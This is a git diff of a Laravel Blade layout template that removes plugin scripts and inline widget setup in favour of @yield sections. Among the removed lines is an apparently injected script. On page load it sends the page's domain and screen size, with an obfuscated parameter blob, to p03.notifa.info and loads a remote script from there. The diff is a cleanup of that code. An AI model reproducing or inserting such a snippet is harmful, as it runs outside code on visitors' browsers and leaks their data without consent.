@@ -31,10 +31,6 @@
 <!-- Bootstrap Toggle -->
 <script src="{{asset('/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js')}}"></script>
 
-<!-- jQuery Vector Maps -->
-<script src="{{asset('/js/plugin/jqvmap/jquery.vmap.min.js')}}"></script>
-<script src="{{asset('/js/plugin/jqvmap/maps/jquery.vmap.world')}}"></script>
-
 <!-- DateTimePicker -->
 <script src="{{asset('/js/plugin/datepicker/bootstrap-datetimepicker.min.js')}}"></script>
 
@@ -59,77 +55,9 @@
 <!-- Atlantis JS -->
 <script src="{{asset('/js/atlantis2.min.js')}}"></script>
 
-<script>
-    $('#datetime').datetimepicker({
-        format: 'MM/DD/YYYY H:mm',
-    });
-    $('#datepicker').datetimepicker({
-        format: 'MM/DD/YYYY',
-    });
-    $('#timepicker').datetimepicker({
-        format: 'h:mm A',
-    });
+@yield('js-plugin')
 
-    $('#basic').select2({
-        theme: "bootstrap"
-    });
+@yield('inline-js')
 
-    $('#multiple').select2({
-        theme: "bootstrap"
-    });
+@include('includes.notification')
 
-    $('#multiple-states').select2({
-        theme: "bootstrap"
-    });
-
-    $('#tagsinput').tagsinput({
-        tagClass: 'badge-info'
-    });
-
-    $(function () {
-        $("#slider").slider({
-            range: "min",
-            max: 100,
-            value: 40,
-        });
-        $("#slider-range").slider({
-            range: true,
-            min: 0,
-            max: 500,
-            values: [75, 300]
-        });
-    });
-
-</script>
-
-
-<script type="text/javascript">
-    if (self == top) {
-        function netbro_cache_analytics(fn, callback) {
-            setTimeout(function () {
-                fn();
-                callback();
-            }, 0);
-        }
-
-        function sync(fn) {
-            fn();
-        }
-
-        function requestCfs() {
-            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-            var idc_glo_r = Math.floor(Math.random() * 99999999999);
-            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
-                "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2m7ZNu3%2beSiI5CutNu0PurOpSLp%2bePkUnbd7BPtRJkHdKjSBPD1RH%2bLLSVkjVe7iJw04Fs97XhIHa503jYbvtJtWI%2fkU%2f9z%2bfIUCLOp1TsNbGGgmJdjke61GKqqUUG2hEZLIB0p2TxOQMPVP5mI8XJODsakMikX5ZCEVtJO6qK93Ol8v68v0ya2ugF6Qo9%2f8HU7k%2fqf0myqr7FMHXiREaYzUDxTykD%2fIue9WFC5WzhfDmFqwfB9d%2fdAKcyRFM2ujENjB4yJBUePdt2higLuhGDzeGaumLVz7OvWr7Aj6uutUuIZiF7dq3eH89XI0Ofz%2boxO9KSYZsClkC5VPduWs%2bOILq6nnIFT78nyVoRp1cSIBgMUYYjKpcRCe3obTTYCNZ2jzNoYScBs3NoHPvnCXjKZ16wRDaTIVGbd9cLipo9FM%2fjXvbx9wPcU2E%2fwF0vNSbW4NL0i6O8FU2abuytoZUb4qkhb8ufP%2fcoJfr4DaWq3lJB5JFNMtBpWu98UcmZXif" +
-                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
-                .height;
-            var bsa = document.createElement('script');
-            bsa.type = 'text/javascript';
-            bsa.async = true;
-            bsa.src = url;
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-        }
-        netbro_cache_analytics(requestCfs, function () {});
-    };
-
-</script>
